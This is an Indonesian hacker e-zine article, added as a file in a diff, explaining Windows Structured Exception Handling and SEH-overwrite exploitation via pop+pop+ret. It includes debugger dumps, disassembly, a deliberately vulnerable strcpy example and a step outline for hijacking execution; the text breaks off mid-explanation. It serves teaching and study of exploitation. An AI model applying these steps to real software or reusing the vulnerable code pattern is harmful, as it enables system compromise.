@@ -1,0 +1,1416 @@
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Tale stories behind pop+pop+ret
+Writer    : !@#$%^&*()
+Contact   : staff@kecoak-elektronik.net
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Introduction
+
+Dalam dunia eksploitasi Microsoft Windows, banyak istilah yang sering kita
+dengar. Mulai dari NX, DEP, ASLR, Trampoline, SEH, dll. Semua merupakan
+ragam teknologi yang diusung oleh sistem operasi Microsoft Windows untuk
+mencegah terjadinya eksploitasi pada sistem operasi tersebut. Namun
+istilah-istilah tersebut menjadi semakin populer karena para researcher
+security berusaha untuk menjebol teknologi tersebut agar dapat mengambil
+alih sistem melalui security hole pada suatu aplikasi.
+
+Pada artikel kali ini, saya akan coba menceritakan salah satu teknologi
+yang dikemas oleh sistem operasi Microsoft Windows namun pada akhirnya
+dimanfaatkan oleh para hacker/security researcher untuk dapat melakukan
+code execution pada mesin target secara efisien dan bahkan lebih stabil.
+
+Tehnik ini termasuk cukup tua dan sebenarnya sudah sulit untuk digunakan
+terhadap teknologi-teknologi security baru yang telah di implementasikan
+oleh Microsoft pada sistem operasi Windows terbarunya, namun hingga saat
+ini masih cukup banyak software-software yang berjalan pada sistem operasi
+Microsoft Windows dapat di eksploitasi menggunakan metode tua ini, dan pada
+kenyataannya sistem operasi Microsoft Windows XP masih merupakan sistem
+operasi terbanyak yang digunakan oleh masyarakat dunia hingga level
+enterprise membuat tehnik ini tetap dapat dinikmati oleh para exploiter.
+Sehingga tidak ada salahnya kita membahas mulai dari asal mula implementasi
+teknologi ini pada Microsoft Windows, metode bypass untuk menghasilkan code
+execution yang lebih stabil, hingga penyempurnaan teknologi ini oleh
+berbagai pihak (mulai dari Mirosoft hingga komunitas security researcher).
+
+Teknologi yang dibicarakan diatas adalah SEH, dan tehnik eksploitasi yang
+akan menikmatinya 'for fun and profit' adalah SEH Overwrite.
+
+
+--[3]-- SEH
+
+SEH merupakan singkatan dari Structured Exception Handling. Artikel tertua
+dan terbaik yang menurut saya pribadi bisa menjelaskan secara gamblang
+serta teknikal mengenai teknologi SEH adalah tulisan Matt Pietrek[1],
+tulisan tersebut dibuat pada January 1997 dan diterbitkan pertama kali
+melalui Microsoft Systems Journal. Teknologi SEH pada saat itu sudah banyak
+digunakan oleh para developer/programmer, namun informasi mengenai
+teknologi SEH secara mendalam terutama mengenai cara kerja internalnya
+sangat terbatas. Berdasarkan keterangan Matt Pietrek, saat itu dokumentasi
+hanya umumnya sebatas informasi dari level compiler.
+
+"All the documentation you're likely to find about SEH describes one
+particular compiler's runtime library wrapping around the operating system
+implementation" - Matt Pietrek, MSJ January 1997
+
+Dokumentasi pada saat itu terbatas penggunaan syntax semacam _try,
+_finally, dan _except yang secara semantics merupakan feature compiler
+untuk memanfaatkan SEH.
+
+Penjelasan lengkap mengenai implementasi SEH Microsoft Windows dapat dibaca
+secara lengkap dari artikel tersebut. Namun intinya, SEH merupakan ekstensi
+yang ditambahkan oleh Microsoft terhadap implementasi bahasa C di
+lingkungan sistem operasi Microsoft Windows untuk menangani exception yang
+muncul 
+
+Exception merupakan suatu trigger yang telah didefinisikan sebelumnya oleh
+sistem operasi, misalnya: jika suatu code berusaha menulis pada suatu
+bagian memory yang sebelumnya telah didefinisikan sebagai readonly, maka
+sistem operasi akan membangkitkan (men-trigger) suatu exception yang
+kemudian dapat ditangkap (catch) oleh aplikasi tersebut untuk dihandle
+ataupun dihandle secara default oleh sistem operasi.
+
+Silahkan perhatikan kembali pernyataan berikut ini: Suatu exception yang
+didapatkan dari suatu aplikasi dapat dihandle oleh aplikasi itu sendiri
+ataupun dihandle oleh sistem operasi.
+
+
+--[4] SEH: High Level Abstraction
+
+Aplikasi yang berjalan diatas sistem operasi Microsoft Windows dapat
+melakukan registrasi terhadap suatu exception yang mungkin akan muncul pada
+saat aplikasi tersebut berjalan (runtime), dengan melakukan registrasi
+tersebut aplikasi dapat menghandle sendiri apabila terdapat suatu
+exception.
+
+Berikut ini contoh penggunaan exception pada program C di Microsoft
+Windows:
+
+
+// except1.c
+
+#include <stdio.h>
+#include <windows.h>
+#include <excpt.h>
+
+int exception_filter(unsigned int code, struct _EXCEPTION_POINTERS *ep) {
+   if (code == EXCEPTION_ACCESS_VIOLATION) {
+      puts("Exception Filter: Access Violation Occurred.");
+
+      // Exception dikenal dan akan dihandle oleh handler	
+      return EXCEPTION_EXECUTE_HANDLER; 
+   }
+   else {
+      puts("Exception Filter: Unknown. Pass to another handler.");
+		
+      // Exception tidak dikenal, cari handler yang lain
+      return EXCEPTION_CONTINUE_SEARCH; 
+   }
+	
+}
+
+int main()
+{
+   int *p = 0x00000000; // assign pointer to NULL
+	
+   __try{
+      puts("Code: Execute protected code.");
+      *p = 13; // assign 13 ke lokasi NULL akan mentrigger exception
+   }
+   __except(exception_filter(GetExceptionCode(),
+                             GetExceptionInformation())) {
+	   puts("Handler: Exception Access Violation will be handled.");
+	   puts("Application will be terminated.");
+	   exit(1);
+   }
+   
+   puts("This part won't be executed if AV occurred.");   
+	
+}
+
+
+Jika dijalankan, maka hasilnya adalah:
+
+
+C:\SEH>except1
+Code: Execute protected code.
+Exception Filter: Access Violation Occurred.
+Handler: Exception Access Violation will be handled.
+Application will be terminated.
+
+
+Pada except1.c diatas, code yang berada didalam scope __try{} merupakan
+bagian code yang akan dilindungi. Jika saat dijalankan code tersebut
+menyebabkan suatu exception, maka bagian __except{} akan dijalankan.
+__except{} akan melakukan filtering jenis exception yang muncul, filtering
+ini akan dilakukan oleh fungsi exception_filter(). Hasil dari
+exception_filter akan menentukan apakah exception yang muncul dapat
+dihandle oleh aplikasi tersebut atau tidak.
+
+exception_filter() akan mengembalikan suatu nilai yang kemudian menentukan
+bagaimana exception tersebut akan dihandle. Ada 3 nilai yang akan
+dievaluasi:
+
+1). EXCEPTION_CONTINUE_EXECUTION(-1), exception is dismissed.
+2). EXCEPTION_CONTINUE_SEARCH(0), exception is not recognized.
+3). EXCEPTION_EXECUTE_HANDLER(1), exception is recognized.
+
+Jika filter mengembalikan nilai EXCEPTION_CONTINUE_EXECUTION, maka eksekusi
+akan dilanjutkan pada titik dimana exception tersebut muncul. Jika filter
+mengembalikan EXCEPTION_CONTINUE_SEARCH, maka sistem operasi diminta untuk
+mencari handler lain yang telah diregister sebelumnya hingga menemukan
+handler yang dapat menangani exception tersebut. Jika filter mengembalikan
+EXCEPTION_EXECUTE_HANDLER, maka exception akan langsung dihandle oleh code
+dibawah blok __except{}, yang berarti bahwa exception dikenal dan handler
+telah siap menangani situasi tersebut.
+
+Program except1.c diatas hanya menuliskan "Handler: Exception Access
+Violation will be handled." dan "Application will be terminated." untuk
+menghandle exception Access Violation dari code yang telah dilindungi. Pada
+bagian terakhir exception handler, program akan di-terminate. Jika
+AV muncul, maka bagian akhir main() diluar blok __try{},__except{} tidak
+akan
+dieksekusi karena handler akan langsung menterminate program.
+
+Dari contoh diatas kita dapat melihat secara langsung implementasi SEH pada
+suatu aplikasi yang berjalan diatas sistem operasi Microsoft Windows dan
+melihat bagaimana suatu aplikasi dapat meregister suatu bagian code untuk
+dilindungi oleh suatu exception handler.
+
+Perlu diketahui juga bahwa registrasi exception handler oleh suatu aplikasi
+sangat bergantung pada runtime library compiler pembangun aplikasi
+tersebut. Yang berarti implementasinya tergantung bagaimana compiler
+tersebut melakukan registrasi exception handler. Namun tetap mengikuti
+prosedur standar implementasi SEH oleh sistem operasi Microsoft Windows itu
+sendiri. Pada journal mengenai SEH diatas, Matt Pietrak telah menunjukan
+bagaimana compiler C++ melakukan registrasi SEH yang memanfaatkan library
+compiler tersebut untuk menangkap semua exception yang muncul kemudian
+diserahkan kepada aplikasi sebagai logic pengambilan keputusan terhadap
+exception tersebut.
+
+
+--[5]-- SEH: Low Level Abstraction
+
+Kita akan melihat bagaimana compiler melakukan registrasi SEH dan bagaimana
+sistem operasi mengimplementasikan SEH saat program dijalankan. Sekali
+lagi, penjelasan mendetail silahkan merujuk pada jurnal matt pietrak. Pada
+bagian ini saya hanya akan menunjukan secara langsung implementasi SEH oleh
+sistem operasi windows.
+
+Mari kita perhatikan kutipan code berikut:
+
+
+// except2.c
+
+#include <stdio.h>
+#include <string.h>
+
+void response(char* name)
+{
+
+  char buf[25];
+
+  strcpy(buf,name);
+  printf("Hello %s\n",buf);
+
+}
+
+void main()
+{
+
+  char *name;
+
+  printf("Name please: ");
+  scanf("%s",name);
+  response(name);
+
+}
+
+
+Whooops, what's this? stack-overflow bugs?! Well, kita akan menuju kesana
+nanti, tapi untuk sementara kita akan melihat secara langsung bagaimana SEH
+diimplementasikan oleh Microsoft Windows.
+
+
+...
+0012FFC4   77E87903  RETURN to KERNEL32.77E87903
+0012FFC8   00000000
+0012FFCC   00000000
+0012FFD0   7FFDF000
+0012FFD4   00000000
+0012FFD8   0012FFC8
+0012FFDC   00000000
+0012FFE0   FFFFFFFF  End of SEH chain
+0012FFE4   77EA13FD  SE handler
+0012FFE8   77E87908  KERNEL32.77E87908
+0012FFEC   00000000
+0012FFF0   00000000
+0012FFF4   00000000
+0012FFF8   00401197  except2.<ModuleEntryPoint>
+0012FFFC   00000000
+
+
+Deretan hexa diatas adalah bagian dari stack frame saat loader windows
+selesai melaksanakan tugasnya dan akan masuk pada main function. Stack
+frame merupakan deretan isi stack pada saat suatu thread aktif. Informasi
+lengkap mengenai thread, process, virtual memory, windows loader, stack
+frame, dsb dapat dibaca dari Micrsoft Windows Internals (berbagai edisi).
+Berikut ini beberapa code program yang akan dijalankan saat memasuki fungsi
+utama (main):
+
+
+..
+00401197  |. 55             PUSH EBP  ; except2.<ModuleEntryPoint>
+00401198  |. 8BEC           MOV EBP,ESP
+0040119A  |. 6A FF          PUSH -1
+0040119C  |. 68 A8604000    PUSH except2.004060A8
+004011A1  |. 68 9C304000    PUSH except2.0040309C ;  SE handler
+installation
+004011A6  |. 64:A1 00000000 MOV EAX,DWORD PTR FS:[0]
+004011AC  |. 50             PUSH EAX
+004011AD  |. 64:8925 000000 MOV DWORD PTR FS:[0],ESP
+004011B4  |. 83EC 10        SUB ESP,10
+004011B7  |. 53             PUSH EBX
+004011B8  |. 56             PUSH ESI
+004011B9  |. 57             PUSH EDI
+004011BA  |. 8965 E8        MOV DWORD PTR SS:[EBP-18],ESP
+..
+
+
+Bagian menarik yang akan menjadi topik pembicaraan kita adalah SEH chain.
+Dapat dilihat pada bagian stack frame sesaat setelah windows loader selesai
+melakukan inisialisasi awal, telah terinstalasi default SEH handler di
+stack.
+
+
+..
+0012FFE0   FFFFFFFF  End of SEH chain
+0012FFE4   77EA13FD  SE handler
+..
+
+
+Saat memasuki awal program, secara default compiler akan melakukan
+registrasi SEH terlebih dahulu disetiap thread yang aktif. Except2.c diatas
+dikompilasi menggunakan Visual C dari Visual Studio 6. Implementasi SEH
+compiler tersebut dapat dilihat pada bagian berikut:
+
+
+004011A1  |. 68 9C304000    PUSH except2.0040309C   ;  SE handler
+installation
+004011A6  |. 64:A1 00000000 MOV EAX,DWORD PTR FS:[0]
+004011AC  |. 50             PUSH EAX
+004011AD  |. 64:8925 000000 MOV DWORD PTR FS:[0],ESP
+
+
+Pada bagian awal thread, compiler akan mengarahkan ESP menuju suatu lokasi
+dibagian code program yang mendefinisikan fungsi SEH. Dan kemudian
+melakukan registrasi SEH tersebut sehingga menjadi suatu SEH chain. SEH
+chain merupakan deretan rantai bentuk implementasi SEH oleh sistem operasi
+Microsoft Windows.
+
+
+      |Next Pointer to SEH| --- \
+      |SEH Handler        |     |
+                                |
+                                |
+ /--- |Next Pointer to SEH| --- /
+ |    |SEH Handler        |     
+ |
+ |
+ \--- |END of SEH Chain   |
+      |SEH Hanlder        |
+
+
+Jurnal Matt Pietrak menggunakan istilah "Prev Pointer to SEH" sedangkan
+literatur saat ini cenderung menggunakan istilah "Next Pointer to SEH".
+Saya memilih untuk mengikuti istilah "Next Pointer to SEH" karena pada
+dasarnya area stack tumbuh kebawah, jadi setiap instalasi SEH Handler oleh
+suatu thread akan didefinisikan pada area stack yang lebih kecil. 
+
+Coba perhatikan lagi beberapa bagian kalimat diatas: "instalasi SEH Handler
+oleh suatu thread". Yup, sistem operasi windows melalui compiler C/C++
+secara default akan meminta compiler untuk meregister suatu SEH Handler
+pada setiap thread yang aktif. Tujuannya adalah setiap thread secara
+default akan dijaga oleh suatu SEH, dan jika terjadi exception pada thread
+tersebut maka eksekusi akan langsung diarahkan kepada SEH Handler. Jika SEH
+Handler thread tersebut tidak dapat menangani exception yang muncul, maka
+eksekusi akan mengikuti alur SEH chain menuju SEH Handler berikutnya.
+Proses ini dilakukan dengan merujuk pada informasi "Next Pointer to SEH",
+jika handler berikutnya belum bisa juga menangani exception yang muncul
+maka eksekusi akan diarahkan ke handler selanjutnya. Proses ini terus
+berjalan hingga menemukan handler yang dapat menangani exception yang
+muncul, atau aplikasi diterminate ketika eksekusi mencapai akhir dari SEH
+Chain.
+
+Berikut ini posisi stack-frame sesaat setelah instalasi SEH diatas:
+
+
+...
+0012FFB0   0012FFE0  Pointer to next SEH record
+0012FFB4   0040309C  SE handler
+0012FFB8   004060A8  except2.004060A8
+0012FFBC   FFFFFFFF
+0012FFC0   0012FFF0
+0012FFC4   77E87903  RETURN to KERNEL32.77E87903
+0012FFC8   00000000
+0012FFCC   00000000
+0012FFD0   7FFDF000
+0012FFD4   00000000
+0012FFD8   0012FFC8
+0012FFDC   00000000
+0012FFE0   FFFFFFFF  End of SEH chain
+0012FFE4   77EA13FD  SE handler
+0012FFE8   77E87908  KERNEL32.77E87908
+0012FFEC   00000000
+0012FFF0   00000000
+0012FFF4   00000000
+0012FFF8   00401197  except2.<ModuleEntryPoint>
+0012FFFC   00000000
+
+
+terdapat tambahan bagian berikut:
+
+..
+0012FFB0   0012FFE0  Pointer to next SEH record
+0012FFB4   0040309C  SE handler
+..
+
+SE handler (SEH) menunjuk suatu bagian code yang didefinisikan oleh
+compiler yang berlokasi di "0040309C" (Virtual Memory). Jika kita lihat
+kode tersebut maka akan tampak barisan code yang berfungsi sebagai SE
+Handler:
+
+
+0040309C  |. 55             PUSH EBP       ;  Structured exception handler
+0040309D  |. 8BEC           MOV EBP,ESP
+0040309F  |. 83EC 08        SUB ESP,8
+004030A2  |. 53             PUSH EBX
+004030A3  |. 56             PUSH ESI
+004030A4  |. 57             PUSH EDI
+004030A5  |. 55             PUSH EBP
+004030A6  |. FC             CLD
+004030A7  |. 8B5D 0C        MOV EBX,DWORD PTR SS:[EBP+C]
+004030AA  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]
+004030AD  |. F740 04 060000 TEST DWORD PTR DS:[EAX+4],6
+004030B4  |. 0F85 82000000  JNZ except2.0040313C
+004030BA  |. 8945 F8        MOV DWORD PTR SS:[EBP-8],EAX
+004030BD  |. 8B45 10        MOV EAX,DWORD PTR SS:[EBP+10]
+004030C0  |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX
+004030C3  |. 8D45 F8        LEA EAX,DWORD PTR SS:[EBP-8]
+004030C6  |. 8943 FC        MOV DWORD PTR DS:[EBX-4],EAX
+004030C9  |. 8B73 0C        MOV ESI,DWORD PTR DS:[EBX+C]
+004030CC  |. 8B7B 08        MOV EDI,DWORD PTR DS:[EBX+8]
+004030CF  |. 83FE FF        CMP ESI,-1
+004030D2  |. 74 61          JE SHORT except2.00403135
+004030D4  |. 8D0C76         LEA ECX,DWORD PTR DS:[ESI+ESI*2]
+004030D7  |. 837C8F 04 00   CMP DWORD PTR DS:[EDI+ECX*4+4],0
+004030DC  |. 74 45          JE SHORT except2.00403123
+004030DE  |. 56             PUSH ESI
+004030DF  |. 55             PUSH EBP
+004030E0  |. 8D6B 10        LEA EBP,DWORD PTR DS:[EBX+10]
+004030E3  |. FF548F 04      CALL DWORD PTR DS:[EDI+ECX*4+4]
+004030E7  |. 5D             POP EBP
+004030E8  |. 5E             POP ESI
+004030E9  |. 8B5D 0C        MOV EBX,DWORD PTR SS:[EBP+C]
+004030EC  |. 0BC0           OR EAX,EAX
+004030EE  |. 74 33          JE SHORT except2.00403123
+004030F0  |. 78 3C          JS SHORT except2.0040312E
+004030F2  |. 8B7B 08        MOV EDI,DWORD PTR DS:[EBX+8]
+004030F5  |. 53             PUSH EBX                  ; Arg1
+004030F6  |. E8 A9FEFFFF    CALL except2.00402FA4     ; except2.00402FA4
+004030FB  |. 83C4 04        ADD ESP,4
+004030FE  |. 8D6B 10        LEA EBP,DWORD PTR DS:[EBX+10]
+00403101  |. 56             PUSH ESI
+00403102  |. 53             PUSH EBX
+00403103  |. E8 DEFEFFFF    CALL except2.00402FE6
+00403108  |. 83C4 08        ADD ESP,8
+0040310B  |. 8D0C76         LEA ECX,DWORD PTR DS:[ESI+ESI*2]
+0040310E  |. 6A 01          PUSH 1
+00403110  |. 8B448F 08      MOV EAX,DWORD PTR DS:[EDI+ECX*4+8]
+00403114  |. E8 61FFFFFF    CALL except2.0040307A
+00403119  |. 8B048F         MOV EAX,DWORD PTR DS:[EDI+ECX*4]
+0040311C  |. 8943 0C        MOV DWORD PTR DS:[EBX+C],EAX
+0040311F  |. FF548F 08      CALL DWORD PTR DS:[EDI+ECX*4+8]
+00403123  |. 8B7B 08        MOV EDI,DWORD PTR DS:[EBX+8]
+00403126  |. 8D0C76         LEA ECX,DWORD PTR DS:[ESI+ESI*2]
+00403129  |. 8B348F         MOV ESI,DWORD PTR DS:[EDI+ECX*4]
+0040312C  |. EB A1          JMP SHORT except2.004030CF
+0040312E  |. B8 00000000    MOV EAX,0
+00403133  |. EB 1C          JMP SHORT except2.00403151
+00403135  |. B8 01000000    MOV EAX,1
+0040313A  |. EB 15          JMP SHORT except2.00403151
+0040313C  |. 55             PUSH EBP
+0040313D  |. 8D6B 10        LEA EBP,DWORD PTR DS:[EBX+10]
+00403140  |. 6A FF          PUSH -1
+00403142  |. 53             PUSH EBX
+00403143  |. E8 9EFEFFFF    CALL except2.00402FE6
+00403148  |. 83C4 08        ADD ESP,8
+0040314B  |. 5D             POP EBP
+0040314C  |. B8 01000000    MOV EAX,1
+00403151  |. 5D             POP EBP
+00403152  |. 5F             POP EDI
+00403153  |. 5E             POP ESI
+00403154  |. 5B             POP EBX
+00403155  |. 8BE5           MOV ESP,EBP
+00403157  |. 5D             POP EBP
+00403158  |. C3             RETN
+
+
+Intinya, jika kita perhatikan hasil SEH Chain setelah registrasi SEH oleh
+thread awal diatas, maka dapat dilihat chain berikut ini:
+
+
+/--- |0012FFE0| // Pointer to Next SEH Record
+|    |0040309C| // SE Handler (SEH)    
+|
+|
+\--- |FFFFFFFF| // End of SEH Chain
+     |77EA13FD| // SE Handler (SEH)
+
+
+Hm, you got the point eh?!
+
+Apakah setiap function() memiliki thread sendiri?!sebenarnya hal tersebut
+sangat bergantung pada implementasi compiler dan spesifikasi sistem operasi
+Microsoft Windows. Opsi-opsi yang kita berikan saat melakukan kompilasi
+juga ikut menentukan apakah suatu function() akan menciptakan thread baru,
+namun seringkali untuk fungsi-fungsi sederhana tidak akan diciptakan thread
+baru oleh Microsoft Windows. Pada contoh except2.c diatas, fungsi
+response() tidak membuat thread baru dimana thread yang digunakan masih
+bagian dari fungsi main(). Sehingga saat program menjalankan fungsi
+response(), tidak ada SEH baru yang diregistrasi.
+
+
+--[5]-- SEH Based Exploit
+
+Tehnik eksploitasi yang memanfaatkan SEH dipublikasikan oleh David Litchfield
+melalui paper riset yang di publish pada bulan september, 2003 [3]. Tehnik
+tersebut memanfaatkan implementasi SEH dan belakangan membuktikan bahwa banyak
+exploit yang justru lebih memilih untuk memanfaatkan SEH karena membuat proses
+eksploitasi lebih mudah dan reliable. 
+
+Kita akan melihat kembali struktur rantai exception handler pada suatu thread
+(anggap saja thread 3):
+
+     
+     |Next Pointer to SEH| --- \
+     |SE Handler         |     |  ---> :app!_except_handler3
+                               |
+                               |
+/--- |Next Pointer to SEH| --- /
+|    |SE Handler         |        ---> :k32!_except_handler3
+|
+|    
+\--- |Next Pointer to SEH|--- \
+     |SE Handler         |     |  ---> :ntdll!_except_handler3
+                               |
+                               |
+     |0xffffffff|-------------/   ---> :END OF SEH Chain
+
+
+app!_except_handler3 merupakan exception handler yang di buat oleh sang
+programmer. Exception handler tersebut diregister ketika alur program memasuki
+fungsi / thread baru. Dan sistem operasi windows akan menambahkan rantai
+exception handler hingga default exception handler pada "End Of SEH Chain".
+Ketika suatu exception terjadi dalam thread diatas, maka alur program akan
+diarahkan menuju SEH Handler untuk mencari SE Handler mana yang dapat
+menangani exception tersebut. Mulai dari app!_except_handler3 hingga akhirnya
+menuju "End Of SEH Chain". Jika mencapai End Of SEH Chain, maka biasanya akan
+muncul window box yang menawarkan apakah kita ingin melakukan debug atau
+mengirimkan exception tersebut kepada microsoft (send / don't send). Setelah
+itu program akan langsung di terminate.
+
+Yang kemudian menjadi pertanyaan, exception seperti apa yang bisa membuat alur
+program menuju SE Handler?Kita telah menyinggung masalah ini diatas, salah
+satunya adalah Access Violation. Jika kita ingat kembali masalah buffer
+overflow, maka tehnik eksploitasi tersebut akan memanfaatkan kelemahan suatu
+program dalam menampung buffer di memory. Buffer akan overflow dan input yang
+diberikan user akan membanjiri bagian lain pada memory (terutama stack), salah
+satu bagian yang dibanjiri adalah saved "EIP" pada stack. Sehingga ketika
+suatu fungsi telah menyelesaikan tugasnya dan akan kembali pada thread
+sebelumnya, nilai register "EIP" yang sebelumnya disimpan pada stack akan
+dikembalikan ke register EIP dan alur program akan menuju nilai EIP tersebut.
+Ketika suatu overflow terjadi dan EIP berisi lokasi memory yang tidak valid,
+maka akan terjadi access violation. Ketika access violation terjadi, sistem
+operasi microsoft windows yang secara default memiliki SE Handler akan
+mengarahkan alur program menuju prosedur SEH.
+
+Saya tidak akan menjelaskan panjang lebar mengenai masalah buffer overflow
+karena konteksnya akan menjadi lebih luas, artikel mengenai buffer overflow
+sangat banyak bertebaran di internet. Dan salah satu yang terbaik menurut saya
+pribadi adalah penjelasan dari Peter Van Eeckhoutte [4]. 
+
+
+[       .text       ] 0x00000000
+[       .data       ]
+[       .bss        ]
+[   bottom of heap  ] --
+[        ...        ]   v
+[        ...        ] area heap
+[        ...        ]   ^
+[   top of heap     ] --
+[     unused        ]
+[   top of stack    ] --
+[        ...        ]   |
+[   main() local var]   |
+[        argc       ]   v
+[        **argv     ] area stack
+[        **envp     ]   ^
+[   cmd line args   ]   |
+[       env vars    ] --
+[                   ] 0xFF000000
+
+
+Ilustrasi diatas merupakan susunan memory secara umum ketika suatu aplikasi /
+program di load dalam arsitektur intel x86. 
+
+Kasus buffer overflow melibatkan area stack, sehingga secara spesifik kita
+akan melihat area tersebut sebagai berikut:
+
+
+[func1::buffer[25]  ]
+[   saved EBP       ]
+[   saved EIP       ]
+[        ...        ]
+[   main() local var]
+[        argc       ]
+[        **argv     ]
+[        **envp	    ]
+[   cmd line args   ]
+[        env vars   ]
+
+
+pada ilustrasi diatas, aplikasi memiliki fungsi yang disebut func1() dan
+didalamnya terdapat variable buffer dengan kapasitas mis: 25 karakter. Ketika
+program dijalankan dan thread berada pada func1(), dengan suatu hal buffer
+diisi karakter yang melebihi kapasitas tersebut (mis: input dari user), maka
+inputan tersebut akan meng-overwrite isi "saved EBP", "saved EIP", dan
+seterusnya. Sehingga ketika func1() berakhir dan alur program akan
+mengembalikan ke posisi sebelum func1() dieksekusi, nilai "saved EIP" akan di
+kembalikan ke register EIP (dan beberapa proses lain nya seperti nilai ESP dan
+EBP). Alur program akan berlanjut menuju lokasi selanjutnya yang terdapat
+dalam register EIP, yang dalam hal ini sudah di-overwrite oleh inputan user
+melalui buffer[25] yang overflow. Jika register EIP menunjuk pada lokasi
+memory yang tidak sesuai maka akan terjadi access violation.
+
+Beberapa tehnik eksploitasi berusaha untuk mengontrol alur program melalui
+register EIP yang dapat di kontrol dengan buffer overflow diatas, namun
+seiring dengan perkembangan teknologi maka sistem operasi semakin dilengkapi
+metode untuk menanggulangi eksploitasi buffer overflow tersebut. Salah satunya
+adalah dengan metode buffer overflow protection [5]. Implementasi proteksi
+pada buffer overflow akan mendeteksi jika terjadi overflow dalam stack, dan
+dalam sistem operasi Microsoft Windows yang telah mengimplementasikan SE
+Handler tentu saja jika terjadi suatu violation (dalam hal ini termasuk
+mendeteksi adanya buffer overflow dalam stack) akan diarahkan ke mekanisme
+SEH.
+
+Sebagian besar exploit yang beredar untuk beragam aplikasi vulnerable dalam
+Microsoft Windows memanfaatkan SEH, termasuk sebagian besar exploit dalam
+metasploit framework. Dalam tehnik eksploitasi yang memanfaatkan SEH, kita
+dapat dengan sengaja membiarkan Access Violation terjadi (melalui buffer
+overflow) hingga sistem operasi mengantarkan kita menuju SE Handler. Seperti
+yang dijelaskan oleh David Litchfield, kita dapat melakukan overwrite pada SEH
+dan Next Pointer to SEH untuk menguasai sistem operasi windows. Dari sinilah
+lahir istilah yang sangat populer dalam dunia eksploitasi microsoft windows,
+yaitu pop+pop+ret. 
+
+Dengan mengetahui bahwa alur program dapat kita kendalikan dengan mudah ketika
+program memasuki SEH, maka yang perlu kita lakukan umumnya adalah:
+
+1. Membuat aplikasi crash sehingga SEH mengambil alih.
+2. Melakukan analisis memory ketika SEH mengambil alih alur program.
+3. Jika aplikasi crash namun rantai SEH tidak di-overwrite (terutama rantai
+awal), maka usahakan agar crash pada aplikasi melakukan overwrite rantai awal
+tersebut.
+4. Mengontrol crash sehingga rantai SEH akan di-overwrite oleh nilai yang
+dapat kita kontrol.
+5. Mengambil alih alur program dengan memanfaatkan SEH.
+
+Kenyataan bahwa SEH terdapat didalam stack dan tidak adanya proses pengecekan
+/ validasi isi SEH tersebut merupakan kesalahan fatal Microsoft. Selama SEH
+berada didalam stack, dan seperti yang kita lihat dari proses buffer overflow
+diatas bahwa didalam stack juga tersimpan beragam variable fungsi yang jika
+terjadi overflow akan membanjiri area stack lainnya maka mudah untuk
+menyimpulkan bahwa isi SEH juga dapat di overwrite oleh inputan user.
+
+Berikut ini alur yang terjadi ketika suatu aplikasi crash dan SEH mengambil
+alih serta metode untuk mengontrol SEH:
+
+
+{Access violation} --------------------
+                                       v
+                                       v
+|Next Pointer to SEH| ---> |shellcode| v
+|SE Handler         | <<<<<<<<<<<<<<<<<
+            |
+            |
+    { pop, pop, ret	}
+	
+	
+Ketika suatu access violation terjadi, maka SEH mengambil alih (SE Handler
+chain awal). Ketika SE Handler mengambil alih - SEH juga merupakan suatu
+fungsi, sehingga layaknya fungsi lain terdapat prologue + epilogue (bisa
+dilihat dengan mudah melalui IDA debugger) - maka dalam prolog exception
+handler alamat "Next Pointer to SEH" diatas diletakan pada posisi "ESP+8".
+Sehingga jika kita bisa meng-overwrite "SE Handler" dengan "pop+pop+ret" maka
+ketika SE Handler akan dieksekusi (tentu saja yang berarti EIP menunjuk pada
+lokasi SE Hanlder), "pop+pop+ret" akan membawa alur program menuju "Next
+Pointer to SEH". "Next Pointer to SEH" dan "SE Handler" masing-masing memiliki
+ukuran 4 bytes, sehingga jika kita bisa meng-overwrite "SE Handler" maka tentu
+saja kita juga dapat meng-overwrite "Next Pointer to SEH" yang akan menunjuk
+lokasi shellcode. 
+
+Dengan metode seperti inilah SEH based exploit bekerja.
+
+
+--[6]-- POP+POP+RET, ESP+8, Windows Trampoline
+
+Tidak semua orang dapat menerima fakta hubungan antara ESP+8 dan POP+POP+RET
+dengan mudah :). Dan tidak banyak yang menjelaskan mengenai hal ini sehingga
+umumnya (terutama mereka yang tidak terbiasa dengan low-level programming)
+akan kebingungan bagaimana bisa prolog "SE Handler" yang meletakan posisi
+"Next Pointer to SEH" di lokasi ESP+8 bisa dimanfaatkan dengan opcode
+"pop+pop+ret". Mari kita lihat struktur stack sekali lagi:
+
+
+[func1::buffer[25]  ] lokasi memory kecil
+[   saved EBP       ]
+[   saved EIP       ]
+[        ...        ]
+[        ...        ] ESP   (0x44444440)
+[        ...        ] ESP+4 (0x44444444)
+[Next Pointer to SEH] ESP+8 (0x44444448)
+[SE Handler         ]       (0x4444444C)
+[        ...        ] lokasi memory besar
+
+
+Yang perlu dipahami adalah "stack tumbuh kebawah" yang modelnya LIFO (Last In
+First Out), tumbuh ke bawah berarti setiap ada penambahan isi stack maka isi
+stack yang baru akan memiliki lokasi memory yang lebih kecil dari isi stack
+sebelumnya. Pada ilustrasi diatas kita bisa lihat bahwa "Next Pointer to SEH"
+berada pada lokasi memory yang lebih kecil dibandingkan "SE Handler". Poin
+kedua yang harus dipahami adalah ESP menunjukan posisi paling atas dalam
+stack, yang berarti ESP akan menunjuk lokasi dari isi terakhir yang
+ditambahkan pada stack.
+
